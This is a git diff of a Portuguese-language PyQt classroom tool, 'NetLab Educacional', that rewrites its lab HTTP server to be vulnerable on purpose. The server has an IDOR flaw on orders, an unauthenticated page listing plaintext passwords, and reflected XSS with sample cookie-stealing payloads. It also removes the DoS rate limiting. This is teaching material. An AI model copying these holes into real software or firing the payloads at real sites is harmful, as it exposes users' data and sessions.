+            conteudo = f"""
+            <div class="card">
+                <h1>Pedido #{pedido_id} nao encontrado</h1>
+                <div class="aviso">IDOR ativo — percorra os IDs: {navegacao}</div>
+                <a href="/pedidos?id=1">Ir para o pedido #1</a>
+            </div>
+            """
+            return self._pagina_base("Pedido", conteudo)
+
+        r = linhas[0]
+        pid, dono_usuario, dono_papel, produto, preco, qtd, total = r
+
+        sinais_servidor.alerta_emitido.emit(
+            f"[IDOR] Pedido #{pid} acessado sem autorizacao. "
+            f"Dono: {dono_usuario} ({dono_papel})"
+        )
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Pedido #{pid}</h1>
+            <div class="aviso">
+                IDOR: este pedido foi acessado sem nenhuma verificacao de autorizacao.<br>
+                Qualquer pessoa pode ver pedidos de qualquer outro usuario apenas alterando o ID.
+            </div>
+            <table>
+                <tbody>
+                    <tr>
+                        <td><strong>ID do pedido</strong></td>
+                        <td>{pid}</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Dono do pedido</strong></td>
+                        <td><span style="color:#E74C3C;">{dono_usuario}</span>
+                            (papel: {dono_papel})</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Produto</strong></td>
+                        <td>{produto}</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Preco unitario</strong></td>
+                        <td>R$ {preco:.2f}</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Quantidade</strong></td>
+                        <td>{qtd}</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Total</strong></td>
+                        <td><strong>R$ {total:.2f}</strong></td>
+                    </tr>
+                </tbody>
+            </table>
+            <br>
+            <p>Navegar por outros pedidos: {navegacao}</p>
+        </div>
+        """
+        return self._pagina_base("Pedido", conteudo)
+
+    def _rota_usuarios(self) -> str:
+        """
+        Lista todos os usuarios com senhas em texto puro.
+
+        VULNERABILIDADE REAL — Divulgacao de Dados Sensiveis:
+          Nenhuma autenticacao necessaria. Qualquer pessoa pode acessar.
+          Senhas armazenadas em texto puro (sem hash).
+        """
+        linhas, _, _ = banco_servidor.consultar_seguro(
+            "SELECT id, username, password, role FROM users ORDER BY id"
+        )
+
+        linhas_html = "".join(
+            f"<tr>"
+            f"<td>{r[0]}</td>"
+            f"<td>{r[1]}</td>"
+            f"<td style='color:#E74C3C; font-family:Consolas;'>{r[2]}</td>"
+            f"<td>{r[3]}</td>"
+            f"</tr>"
+            for r in linhas
+        )
+
+        sinais_servidor.alerta_emitido.emit(
+            f"[DIVULGACAO] /usuarios acessado — {len(linhas)} usuarios e "
+            f"senhas em texto puro expostos sem autenticacao"
+        )
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Lista de Usuarios</h1>
+            <div class="aviso">
+                Vulnerabilidades:<br>
+                - Sem autenticacao para acessar esta pagina<br>
+                - Senhas armazenadas em texto puro (sem hash)<br>
+                - Dados exibidos sem controle de acesso
+            </div>
+            <div class="info">
+                Use estas credenciais para testar o login e o SQL Injection.<br>
+                Tambem disponiveis em JSON: <a href="/api/usuarios">/api/usuarios</a>
+            </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Usuario</th>
+                        <th>Senha (texto puro)</th>
+                        <th>Papel</th>
+                    </tr>
+                </thead>
+                <tbody>{linhas_html}</tbody>
+            </table>
+        </div>
+        """
+        return self._pagina_base("Usuarios", conteudo)
+
+    def _rota_perfil(self, params: dict) -> str:
+        """
+        Exibe perfil de usuario com o nome refletido.
+
+        VULNERABILIDADE REAL — XSS Refletido:
+          O parametro ?nome= e inserido diretamente no HTML sem escape.
+          Scripts no parametro sao executados imediatamente no browser.
+        """
+        # Valor recebido sem nenhum tratamento
+        nome_bruto = params.get("nome", [""])[0]
+
+        if _detectar_xss(nome_bruto):
+            sinais_servidor.alerta_emitido.emit(
+                f"[XSS REFLETIDO] /perfil?nome=: '{nome_bruto[:80]}'"
+            )
+
+        # XSS REAL: nome_bruto inserido diretamente no HTML sem escape
+        bloco_nome = (
+            f"<h2>Perfil de: {nome_bruto}</h2>"
+            if nome_bruto else
+            "<h2>Perfil</h2>"
+        )
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Pagina de Perfil</h1>
+            <div class="aviso">
+                XSS Refletido: o parametro <code>?nome=</code> e inserido
+                diretamente no HTML sem escape algum.
+            </div>
+            <div class="info">
+                Teste: <code>/perfil?nome=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
+                Teste: <code>/perfil?nome=&lt;img src=x onerror=alert(1)&gt;</code>
+            </div>
+            <!-- XSS REAL: nome_bruto inserido sem escape abaixo -->
+            {bloco_nome}
+            <br>
+            <form method="GET" action="/perfil">
+                <label>Nome do usuario</label>
+                <input type="text" name="nome" placeholder="Digite um nome">
+                <button type="submit">Ver perfil</button>
+            </form>
+        </div>
+        """
+        return self._pagina_base("Perfil", conteudo)
+
+    # -----------------------------------------------------------------------
+    # Helpers HTTP — envio de respostas
+    # -----------------------------------------------------------------------
+
+    def _enviar_html(self, status: int, corpo: str, cookie: str = ""):
+        """Envia uma resposta com conteudo HTML."""
+        corpo_bytes = corpo.encode("utf-8")
+        self.send_response(status)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(corpo_bytes)))
+        if cookie:
+            self.send_header("Set-Cookie", cookie)
+        self.end_headers()
+        self.wfile.write(corpo_bytes)
+
+    def _enviar_json(self, status: int, dados: dict):
+        """Envia uma resposta com conteudo JSON."""
+        corpo_bytes = json.dumps(dados, ensure_ascii=False, indent=2).encode("utf-8")
+        self.send_response(status)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.send_header("Content-Length", str(len(corpo_bytes)))
+        self.end_headers()
+        self.wfile.write(corpo_bytes)
+
+    def _redirecionar(self, destino: str):
+        """Envia um redirect HTTP 302."""
+        self.send_response(302)
+        self.send_header("Location", destino)
+        self.end_headers()
+
+    def _registrar(self, ip: str, metodo: str, caminho: str,
+                   tamanho: int, ts_inicio: float, corpo: str = ""):
+        """Registra a requisicao e notifica a interface Qt via sinal."""
+        tempo_ms = int((time.time() - ts_inicio) * 1000)
+        dados = {
             "timestamp":    datetime.now().strftime("%H:%M:%S"),
             "ip_cliente":   ip,
             "metodo":       metodo,
-            "endpoint":     path,
+            "endpoint":     caminho,
             "tamanho":      tamanho,
-            "user_agent":   self.headers.get("User-Agent", "—")[:50],
+            "user_agent":   self.headers.get("User-Agent", "")[:40],
             "tempo_ms":     tempo_ms,
-            "reqs_por_seg": reqs_por_seg,
-            "bloqueado":    bloqueado,
-            "corpo":        corpo[:500] if corpo else "",
-        })
+            "reqs_por_seg": 0,
+            "bloqueado":    False,
+            "corpo":        corpo,
+        }
+        sinais_servidor.requisicao_recebida.emit(dados)
+
+        # Detecta ataques no corpo do POST para alertas adicionais
+        if corpo:
+            if _detectar_sqli(corpo):
+                sinais_servidor.alerta_emitido.emit(
+                    f"[SQL INJECTION] POST {caminho} de {ip}: '{corpo[:60]}'"
+                )
+            elif _detectar_xss(corpo):
+                sinais_servidor.alerta_emitido.emit(
+                    f"[XSS] POST {caminho} de {ip}: '{corpo[:60]}'"
+                )
 
     def log_message(self, formato, *args):
-        """Suprime saída padrão do HTTPServer no terminal."""
+        """Suprime a saida de log padrao do HTTPServer no terminal."""
         pass
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ===========================================================================
 # Servidor HTTP multi-thread
-# ─────────────────────────────────────────────────────────────────────────────
+# ===========================================================================
 
-class ServidorHTTPThreaded(ThreadingMixIn, HTTPServer):
-    """Servidor com suporte a múltiplas conexões simultâneas."""
-    daemon_threads     = True
-    request_queue_size = 64
+class ServidorHTTPMultithread(ThreadingMixIn, HTTPServer):
+    """Servidor HTTP com suporte a multiplas conexoes simultaneas."""
+    daemon_threads = True
 
     def handle_error(self, request, client_address):
-        """Silencia erros esperados de conexões abruptas em testes de carga."""
+        """Silencia erros de conexao abruptamente encerrada (comuns em testes de carga)."""
         import sys
-        exc_type, _, _ = sys.exc_info()
-        if exc_type and issubclass(
-            exc_type,
-            (BrokenPipeError, ConnectionResetError, ConnectionAbortedError)
-        ):
+        tipo_exc, _, _ = sys.exc_info()
+        if tipo_exc and issubclass(tipo_exc, (BrokenPipeError,
+                                               ConnectionResetError,
+                                               ConnectionAbortedError)):
             return
-        return super().handle_error(request, client_address)
+        super().handle_error(request, client_address)
 
 
 class ThreadServidor(threading.Thread):
-    """Thread dedicada ao servidor HTTP — não bloqueia a interface Qt."""
+    """Thread dedicada ao servidor HTTP — nao bloqueia a interface Qt."""
 
     def __init__(self, porta: int):
         super().__init__(daemon=True)
-        self.porta    = porta
-        self._servidor: Optional[HTTPServer] = None
+        self.porta   = porta
+        self._server: Optional[HTTPServer] = None
 
     def run(self):
+        """Inicia o servidor e aguarda requisicoes."""
         try:
-            self._servidor = ServidorHTTPThreaded(
-                ("0.0.0.0", self.porta),
-                HandlerLabEducacional
+            self._server = ServidorHTTPMultithread(
+                ("0.0.0.0", self.porta), HandlerVulneravel
             )
             sinais_servidor.status_alterado.emit(
-                f"✅ Servidor iniciado na porta {self.porta}"
+                f"Servidor vulneravel iniciado na porta {self.porta}"
             )
-            self._servidor.serve_forever()
+            self._server.serve_forever()
         except Exception as erro:
-            sinais_servidor.status_alterado.emit(
-                f"❌ Erro ao iniciar servidor: {erro}"
-            )
+            sinais_servidor.status_alterado.emit(f"Erro ao iniciar servidor: {erro}")
 
     def parar(self):
-        if self._servidor:
+        """Para o servidor de forma nao-bloqueante."""
+        if self._server:
             threading.Thread(
-                target=self._servidor.shutdown,
-                daemon=True
+                target=self._server.shutdown, daemon=True
             ).start()
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Painel da aba "Servidor de Laboratório"
-# ─────────────────────────────────────────────────────────────────────────────
+# ===========================================================================
+# Widget Qt — Painel do Servidor de Laboratorio
+# ===========================================================================
 
 class PainelServidor(QWidget):
     """
-    Aba 'Servidor de Laboratório' do NetLab Educacional.
+    Aba 'Servidor de Laboratorio' do NetLab Educacional.
 
-    Permite ao professor:
-    - Iniciar e parar um servidor HTTP de teste (sempre em modo vulnerável)
-    - Monitorar requisições HTTP em tempo real
-    - Ativar proteção didática contra DoS para demonstração de sobrecarga
-    - Visualizar alertas de comportamento anômalo
+    Permite iniciar e parar um servidor HTTP vulneravel para demonstracoes
+    de seguranca em sala de aula. Exibe requisicoes e alertas em tempo real.
     """
 
-    # Sinal para a janela principal quando um cliente se conecta
+    # Sinal emitido quando um cliente acessa o servidor (compatibilidade com janela_principal)
     cliente_detectado = pyqtSignal(str)
 
     def __init__(self, parent=None):
         super().__init__(parent)
         self._thread_servidor: Optional[ThreadServidor] = None
-        self._servidor_ativo   = False
-        self._total_requisicoes = 0
-        self._total_bytes       = 0
-        self._reqs_por_segundo  = 0
-        self._contador_segundo  = 0
-        self._clientes_unicos   = set()
+        self._servidor_ativo       = False
+        self._total_requisicoes    = 0
+        self._total_bytes          = 0
+        self._contador_por_segundo = 0
+        self._clientes_unicos: set = set()
+        self._porta_atual          = 8080
 
-        # Valores padrão dos controles
-        self._porta_atual  = 8080
-        self._limite_atual = 10
-        self._tempo_atual  = 30
-
-        # Timer para contar req/s
         self._timer_metricas = QTimer()
         self._timer_metricas.timeout.connect(self._atualizar_metricas_por_segundo)
 
-        # Conecta sinais do servidor à interface
         sinais_servidor.requisicao_recebida.connect(self._ao_receber_requisicao)
         sinais_servidor.status_alterado.connect(self._ao_mudar_status)
         sinais_servidor.alerta_emitido.connect(self._ao_emitir_alerta)
 
         self._montar_layout()
 
-    # ─────────────────────────────────────────────────────────────────────
-    # Montagem da interface
-    # ─────────────────────────────────────────────────────────────────────
+    # -----------------------------------------------------------------------
+    # Construcao da interface
+    # -----------------------------------------------------------------------
 
     def _montar_layout(self):
+        """Monta o layout principal do painel com splitter horizontal."""
         layout = QVBoxLayout(self)
         layout.setContentsMargins(4, 2, 4, 4)
         layout.setSpacing(4)
@@ -727,10 +1540,10 @@ class PainelServidor(QWidget):
 
         splitter.addWidget(self._criar_painel_controles())
         splitter.addWidget(self._criar_painel_requisicoes())
-        splitter.setSizes([380, 700])
+        splitter.setSizes([350, 730])
 
     def _criar_painel_controles(self) -> QWidget:
-        """Painel esquerdo: controles, status, métricas e proteção DoS."""
+        """Painel esquerdo: configuracao, status e metricas."""
         widget = QWidget()
         layout = QVBoxLayout(widget)
         layout.setContentsMargins(0, 0, 8, 0)
@@ -739,236 +1552,171 @@ class PainelServidor(QWidget):
         layout.addWidget(self._criar_grupo_configuracao())
         layout.addWidget(self._criar_grupo_status())
         layout.addWidget(self._criar_grupo_metricas())
-        layout.addWidget(self._criar_grupo_protecao_dos())
         layout.addStretch()
 
         return widget
 
     def _criar_grupo_configuracao(self) -> QGroupBox:
-        grp = QGroupBox("⚙️ Configuração")
-        grp.setStyleSheet(self._estilo_grupo())
+        """Grupo de configuracao: porta e botao iniciar/parar."""
+        grp = QGroupBox("Configuracao")
+        grp.setStyleSheet(
+            "QGroupBox { border: 1px solid #1e3a5f; border-radius: 6px; "
+            "margin-top: 8px; font-weight: bold; color: #bdc3c7; }"
+            "QGroupBox::title { subcontrol-origin: margin; padding: 0 6px; }"
+        )
         layout = QGridLayout(grp)
 
         lbl_porta = QLabel("Porta:")
-        lbl_porta.setStyleSheet("color:#ecf0f1; font-size:11px;")
+        lbl_porta.setStyleSheet("color: #ecf0f1; font-size: 11px;")
         layout.addWidget(lbl_porta, 0, 0)
 
-        # Controle de porta
-        container_porta = QWidget()
-        container_porta.setFixedHeight(30)
-        hbox = QHBoxLayout(container_porta)
-        hbox.setContentsMargins(0, 0, 0, 0)
-        hbox.setSpacing(2)
+        # Controle de porta com botoes +/-
+        cont_porta = QWidget()
+        hbox_porta = QHBoxLayout(cont_porta)
+        hbox_porta.setContentsMargins(0, 0, 0, 0)
+        hbox_porta.setSpacing(2)
 
-        btn_menos = self._criar_botao_controle("−", "#3498db", 18, 18)
-        btn_menos.clicked.connect(lambda: self._ajustar_valor("porta", -1))
-        hbox.addWidget(btn_menos)
+        btn_menos = self._criar_botao_controle("-", "#3498DB", 18, 18)
+        btn_menos.clicked.connect(lambda: self._ajustar_porta(-1))
+        hbox_porta.addWidget(btn_menos)
 
         self.lbl_porta = QLabel(str(self._porta_atual))
-        self.lbl_porta.setFixedSize(50, 25)
+        self.lbl_porta.setFixedSize(52, 25)
         self.lbl_porta.setAlignment(Qt.AlignmentFlag.AlignCenter)
         self.lbl_porta.setStyleSheet(
-            "background:#0d1a2a; color:#ecf0f1; border:1px solid #3498db;"
-            "border-radius:4px; font-size:12px; font-weight:bold;"
+            "background: #0d1a2a; color: #ecf0f1; border: 1px solid #3498DB;"
+            "border-radius: 4px; font-size: 12px; font-weight: bold;"
         )
-        hbox.addWidget(self.lbl_porta)
+        hbox_porta.addWidget(self.lbl_porta)
 
-        btn_mais = self._criar_botao_controle("+", "#3498db", 18, 18)
-        btn_mais.clicked.connect(lambda: self._ajustar_valor("porta", 1))
-        hbox.addWidget(btn_mais)
+        btn_mais = self._criar_botao_controle("+", "#3498DB", 18, 18)
+        btn_mais.clicked.connect(lambda: self._ajustar_porta(+1))
+        hbox_porta.addWidget(btn_mais)
 
-        layout.addWidget(container_porta, 0, 1)
+        layout.addWidget(cont_porta, 0, 1)
 
-        self.btn_iniciar = QPushButton("▶  Iniciar Servidor")
+        self.btn_iniciar = QPushButton("Iniciar Servidor")
         self.btn_iniciar.setObjectName("botao_captura")
-        self.btn_iniciar.setMinimumHeight(32)
+        self.btn_iniciar.setMinimumHeight(30)
         self.btn_iniciar.clicked.connect(self._alternar_servidor)
         layout.addWidget(self.btn_iniciar, 1, 0, 1, 2)
 
         return grp
 
     def _criar_grupo_status(self) -> QGroupBox:
-        grp = QGroupBox("📡 Status do Servidor")
-        grp.setStyleSheet(self._estilo_grupo())
+        """Grupo de status: estado do servidor e endereco de acesso."""
+        grp = QGroupBox("Status do Servidor")
+        grp.setStyleSheet(
+            "QGroupBox { border: 1px solid #1e3a5f; border-radius: 6px; "
+            "margin-top: 2px; font-weight: bold; color: #bdc3c7; }"
+            "QGroupBox::title { subcontrol-origin: margin; padding: 0 3px; }"
+        )
         layout = QVBoxLayout(grp)
 
-        self.lbl_status = QLabel("⏹️  Servidor parado")
-        self.lbl_status.setStyleSheet("color:#E74C3C; font-weight:bold; font-size:11px;")
+        self.lbl_status = QLabel("Servidor parado")
+        self.lbl_status.setStyleSheet(
+            "color: #E74C3C; font-weight: bold; font-size: 11px;"
+        )
         layout.addWidget(self.lbl_status)
 
         self.lbl_endereco = QTextEdit()
         self.lbl_endereco.setReadOnly(True)
-        self.lbl_endereco.setMaximumHeight(50)
+        self.lbl_endereco.setMaximumHeight(55)
         self.lbl_endereco.setStyleSheet(
-            "color:#3498DB; font-family:Consolas; font-size:11px;"
-            "background:#0d1a2a; border:1px solid #1e3a5f; border-radius:4px; padding:6px;"
+            "color: #3498DB; font-family: Consolas; font-size: 11px;"
+            "background: #0d1a2a; border: 1px solid #1e3a5f; border-radius: 4px; padding: 6px;"
         )
-        self.lbl_endereco.setText("—")
+        self.lbl_endereco.setText("---")
         layout.addWidget(self.lbl_endereco)
 
-        instrucao = QLabel(
-            "Após iniciar, acesse o endereço acima\n"
-            "de qualquer dispositivo na mesma rede Wi-Fi."
+        lbl_instr = QLabel(
+            "Acesse o endereco acima de qualquer\n"
+            "dispositivo na mesma rede Wi-Fi."
         )
-        instrucao.setStyleSheet("color:#7f8c8d; font-size:10px;")
-        instrucao.setWordWrap(True)
-        layout.addWidget(instrucao)
+        lbl_instr.setStyleSheet("color: #7f8c8d; font-size: 10px;")
+        lbl_instr.setWordWrap(True)
+        layout.addWidget(lbl_instr)
 
         return grp
 
     def _criar_grupo_metricas(self) -> QGroupBox:
-        grp = QGroupBox("📊 Métricas em Tempo Real")
-        grp.setStyleSheet(self._estilo_grupo())
+        """Grupo de metricas: contadores em tempo real."""
+        grp = QGroupBox("Metricas em Tempo Real")
+        grp.setStyleSheet(
+            "QGroupBox { border: 1px solid #1e3a5f; border-radius: 6px; "
+            "margin-top: 8px; font-weight: bold; color: #bdc3c7; }"
+            "QGroupBox::title { subcontrol-origin: margin; padding: 0 6px; }"
+        )
         layout = QGridLayout(grp)
 
-        def _card(rotulo: str, valor: str, cor: str):
-            lbl_r = QLabel(rotulo)
-            lbl_r.setStyleSheet(f"color:{cor}; font-size:9px; font-weight:bold;")
-            lbl_v = QLabel(valor)
-            lbl_v.setStyleSheet("color:#ecf0f1; font-size:16px; font-weight:bold;")
-            lbl_v.setAlignment(Qt.AlignmentFlag.AlignCenter)
-            lbl_r.setAlignment(Qt.AlignmentFlag.AlignCenter)
-            return lbl_r, lbl_v
+        def _card_metrica(rotulo: str, valor: str, cor: str) -> tuple:
+            """Cria um card de metrica com rotulo e valor destacado."""
+            lbl_rotulo = QLabel(rotulo)
+            lbl_rotulo.setStyleSheet(
+                f"color: {cor}; font-size: 9px; font-weight: bold;"
+            )
+            lbl_rotulo.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            lbl_valor = QLabel(valor)
+            lbl_valor.setStyleSheet(
+                "color: #ecf0f1; font-size: 15px; font-weight: bold;"
+            )
+            lbl_valor.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            return lbl_rotulo, lbl_valor
 
-        lbl_r1, self.lbl_total_reqs  = _card("TOTAL REQS", "0",   "#3498DB")
-        lbl_r2, self.lbl_reqs_seg    = _card("REQS/SEG",   "0",   "#E74C3C")
-        lbl_r3, self.lbl_total_bytes = _card("DADOS",      "0 B", "#2ECC71")
-        lbl_r4, self.lbl_clientes    = _card("CLIENTES",   "0",   "#9B59B6")
+        lr1, self.lbl_total_reqs  = _card_metrica("TOTAL REQS", "0",   "#3498DB")
+        lr2, self.lbl_reqs_seg    = _card_metrica("REQS/SEG",   "0",   "#E74C3C")
+        lr3, self.lbl_total_bytes = _card_metrica("DADOS",      "0 B", "#2ECC71")
+        lr4, self.lbl_clientes    = _card_metrica("CLIENTES",   "0",   "#9B59B6")
 
-        for col, (lr, lv) in enumerate([
-            (lbl_r1, self.lbl_total_reqs),
-            (lbl_r2, self.lbl_reqs_seg),
-            (lbl_r3, self.lbl_total_bytes),
-            (lbl_r4, self.lbl_clientes),
+        for coluna, (lr, lv) in enumerate([
+            (lr1, self.lbl_total_reqs),
+            (lr2, self.lbl_reqs_seg),
+            (lr3, self.lbl_total_bytes),
+            (lr4, self.lbl_clientes),
         ]):
             frame = QFrame()
             frame.setStyleSheet(
-                "QFrame { background:#0d1a2a; border:1px solid #1e3a5f; border-radius:6px; }"
+                "QFrame { background: #0d1a2a; border: 1px solid #1e3a5f; "
+                "border-radius: 6px; }"
             )
             fl = QVBoxLayout(frame)
             fl.setContentsMargins(4, 4, 4, 4)
             fl.addWidget(lr)
             fl.addWidget(lv)
-            layout.addWidget(frame, 0, col)
+            layout.addWidget(frame, 0, coluna)
 
-        # Barra de carga visual
         self.barra_carga = QProgressBar()
         self.barra_carga.setRange(0, 50)
         self.barra_carga.setValue(0)
         self.barra_carga.setTextVisible(False)
-        self.barra_carga.setStyleSheet("""
-            QProgressBar { background:#0d1a2a; border:1px solid #1e3a5f;
-                           border-radius:4px; height:12px; }
-            QProgressBar::chunk { background:#3498DB; border-radius:3px; }
-        """)
-        layout.addWidget(QLabel("Carga do servidor:"), 1, 0, 1, 2)
+        self.barra_carga.setStyleSheet(
+            "QProgressBar { background: #0d1a2a; border: 1px solid #1e3a5f;"
+            "border-radius: 4px; height: 10px; }"
+            "QProgressBar::chunk { background: #3498DB; border-radius: 3px; }"
+        )
+        lbl_carga = QLabel("Carga:")
+        lbl_carga.setStyleSheet("color: #7f8c8d; font-size: 10px;")
+        layout.addWidget(lbl_carga,       1, 0, 1, 2)
         layout.addWidget(self.barra_carga, 1, 2, 1, 2)
 
         return grp
 
-    def _criar_grupo_protecao_dos(self) -> QGroupBox:
-        """Grupo de proteção didática contra DoS (independente do login)."""
-        grp = QGroupBox("🛡️ Proteção Didática (Demo DoS)")
-        grp.setStyleSheet(
-            "QGroupBox { border:1px solid #E67E22; border-radius:6px;"
-            " margin-top:3px; font-weight:bold; color:#E67E22; }"
-            "QGroupBox::title { subcontrol-origin:margin; padding:0 3px; }"
+    @staticmethod
+    def _criar_botao_controle(texto: str, cor: str, larg: int, alt: int) -> QPushButton:
+        """Cria um botao compacto de controle numerico."""
+        btn = QPushButton(texto)
+        btn.setFixedSize(larg, alt)
+        btn.setStyleSheet(
+            f"QPushButton {{ background: #2c3e50; color: white; "
+            f"border: 1px solid {cor}; border-radius: 4px; "
+            f"font-size: 14px; font-weight: bold; padding: 0; }}"
+            f"QPushButton:hover {{ background: #34495e; }}"
+            f"QPushButton:pressed {{ background: #1e2b3a; }}"
         )
-        layout = QVBoxLayout(grp)
-        layout.setSpacing(8)
-
-        # Checkbox de ativação
-        self.chk_protecao = QCheckBox("Ativar proteção rate limiting")
-        self.chk_protecao.setStyleSheet("color:#ecf0f1; font-size:11px;")
-        self.chk_protecao.stateChanged.connect(self._ao_mudar_protecao)
-        layout.addWidget(self.chk_protecao)
-
-        # Grid de controles
-        container = QWidget()
-        grid = QGridLayout(container)
-        grid.setContentsMargins(0, 0, 0, 0)
-        grid.setVerticalSpacing(6)
-        grid.setHorizontalSpacing(8)
-
-        # Limite req/s
-        lbl_limite = QLabel("Limite req/s por IP:")
-        lbl_limite.setStyleSheet("color:#ecf0f1; font-size:11px;")
-        grid.addWidget(lbl_limite, 0, 0, Qt.AlignmentFlag.AlignVCenter)
-
-        container_limite = QWidget()
-        hbox_limite = QHBoxLayout(container_limite)
-        hbox_limite.setContentsMargins(0, 0, 0, 0)
-        hbox_limite.setSpacing(2)
-
-        self.btn_limite_menos = self._criar_botao_controle("−", "#E67E22", 16, 16)
-        self.btn_limite_menos.setEnabled(False)
-        self.btn_limite_menos.clicked.connect(lambda: self._ajustar_valor("limite", -1))
-        hbox_limite.addWidget(self.btn_limite_menos)
-
-        self.lbl_limite = QLabel(str(self._limite_atual))
-        self.lbl_limite.setFixedSize(35, 18)
-        self.lbl_limite.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.lbl_limite.setStyleSheet(
-            "background:#0d1a2a; color:#ecf0f1; border:1px solid #E67E22;"
-            "border-radius:4px; font-size:11px; font-weight:bold; padding:3px;"
-        )
-        hbox_limite.addWidget(self.lbl_limite)
-
-        self.btn_limite_mais = self._criar_botao_controle("+", "#E67E22", 16, 16)
-        self.btn_limite_mais.setEnabled(False)
-        self.btn_limite_mais.clicked.connect(lambda: self._ajustar_valor("limite", 1))
-        hbox_limite.addWidget(self.btn_limite_mais)
-
-        grid.addWidget(container_limite, 0, 1, Qt.AlignmentFlag.AlignLeft)
-
-        # Tempo de bloqueio
-        lbl_tempo = QLabel("Tempo de bloqueio (s):")
-        lbl_tempo.setStyleSheet("color:#ecf0f1; font-size:11px;")
-        grid.addWidget(lbl_tempo, 1, 0, Qt.AlignmentFlag.AlignVCenter)
-
-        container_tempo = QWidget()
-        hbox_tempo = QHBoxLayout(container_tempo)
-        hbox_tempo.setContentsMargins(0, 0, 0, 0)
-        hbox_tempo.setSpacing(2)
-
-        self.btn_tempo_menos = self._criar_botao_controle("−", "#E67E22", 16, 16)
-        self.btn_tempo_menos.setEnabled(False)
-        self.btn_tempo_menos.clicked.connect(lambda: self._ajustar_valor("tempo", -1))
-        hbox_tempo.addWidget(self.btn_tempo_menos)
-
-        self.lbl_tempo = QLabel(str(self._tempo_atual))
-        self.lbl_tempo.setFixedSize(35, 18)
-        self.lbl_tempo.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        self.lbl_tempo.setStyleSheet(
-            "background:#0d1a2a; color:#ecf0f1; border:1px solid #E67E22;"
-            "border-radius:4px; font-size:11px; font-weight:bold; padding:3px;"
-        )
-        hbox_tempo.addWidget(self.lbl_tempo)
-
-        self.btn_tempo_mais = self._criar_botao_controle("+", "#E67E22", 16, 16)
-        self.btn_tempo_mais.setEnabled(False)
-        self.btn_tempo_mais.clicked.connect(lambda: self._ajustar_valor("tempo", 1))
-        hbox_tempo.addWidget(self.btn_tempo_mais)
-
-        grid.addWidget(container_tempo, 1, 1, Qt.AlignmentFlag.AlignLeft)
-
-        layout.addWidget(container)
-
-        # Botão desbloquear IPs
-        self.btn_desbloquear = QPushButton("🔓 Desbloquear todos os IPs")
-        self.btn_desbloquear.setFixedHeight(20)
-        self.btn_desbloquear.setStyleSheet(
-            "QPushButton { background:#1e3a5f; color:#ecf0f1; border:none;"
-            " border-radius:4px; padding:0; font-size:11px; }"
-            "QPushButton:hover { background:#2a5080; }"
-        )
-        self.btn_desbloquear.clicked.connect(self._desbloquear_ips)
-        layout.addWidget(self.btn_desbloquear)
-
-        return grp
+        return btn
 
     def _criar_painel_requisicoes(self) -> QWidget:
-        """Painel direito: tabela de requisições e log de alertas."""
+        """Painel direito: tabela de requisicoes e log de alertas."""
         widget = QWidget()
         layout = QVBoxLayout(widget)
         layout.setContentsMargins(8, 0, 0, 0)
@@ -977,22 +1725,22 @@ class PainelServidor(QWidget):
         splitter_v = QSplitter(Qt.Orientation.Vertical)
         layout.addWidget(splitter_v)
 
-        # Tabela de requisições
-        w_tab = QWidget()
-        l_tab = QVBoxLayout(w_tab)
-        l_tab.setContentsMargins(0, 0, 0, 0)
+        # Tabela de requisicoes recebidas
+        w_tabela = QWidget()
+        l_tabela = QVBoxLayout(w_tabela)
+        l_tabela.setContentsMargins(0, 0, 0, 0)
 
-        lbl = QLabel("  📋 Requisições Recebidas em Tempo Real")
-        fonte = QFont("Arial", 10)
-        fonte.setBold(True)
-        lbl.setFont(fonte)
-        lbl.setStyleSheet("color:#bdc3c7;")
-        l_tab.addWidget(lbl)
+        lbl_tabela = QLabel("Requisicoes Recebidas em Tempo Real")
+        fonte_tabela = QFont("Arial", 10)
+        fonte_tabela.setBold(True)
+        lbl_tabela.setFont(fonte_tabela)
+        lbl_tabela.setStyleSheet("color: #bdc3c7;")
+        l_tabela.addWidget(lbl_tabela)
 
-        self.tabela_reqs = QTableWidget(0, 8)
+        self.tabela_reqs = QTableWidget(0, 7)
         self.tabela_reqs.setHorizontalHeaderLabels([
-            "Hora", "IP", "Método", "Endpoint",
-            "Tamanho", "User-Agent", "Tempo(ms)", "Req/s",
+            "Hora", "IP Cliente", "Metodo", "Endpoint",
+            "Tamanho", "Tempo(ms)", "Payload"
         ])
         self.tabela_reqs.horizontalHeader().setSectionResizeMode(
             QHeaderView.ResizeMode.ResizeToContents
@@ -1000,278 +1748,235 @@ class PainelServidor(QWidget):
         self.tabela_reqs.horizontalHeader().setStretchLastSection(True)
         self.tabela_reqs.verticalHeader().setVisible(False)
         self.tabela_reqs.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
+        self.tabela_reqs.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
         self.tabela_reqs.setAlternatingRowColors(True)
-        l_tab.addWidget(self.tabela_reqs)
-        splitter_v.addWidget(w_tab)
+        l_tabela.addWidget(self.tabela_reqs)
+        splitter_v.addWidget(w_tabela)
 
-        # Área de alertas educacionais
+        # Log de alertas de seguranca
         w_alertas = QWidget()
         l_alertas = QVBoxLayout(w_alertas)
         l_alertas.setContentsMargins(0, 0, 0, 0)
 
-        lbl_alerta = QLabel("⚠️  Alertas Didáticos")
-        lbl_alerta.setStyleSheet("color:#E67E22; font-weight:bold; font-size:10px;")
-        l_alertas.addWidget(lbl_alerta)
+        lbl_alertas = QLabel("Alertas de Vulnerabilidades Detectadas")
+        lbl_alertas.setStyleSheet(
+            "color: #E67E22; font-weight: bold; font-size: 10px;"
+        )
+        l_alertas.addWidget(lbl_alertas)
 
         self.texto_alertas = QTextEdit()
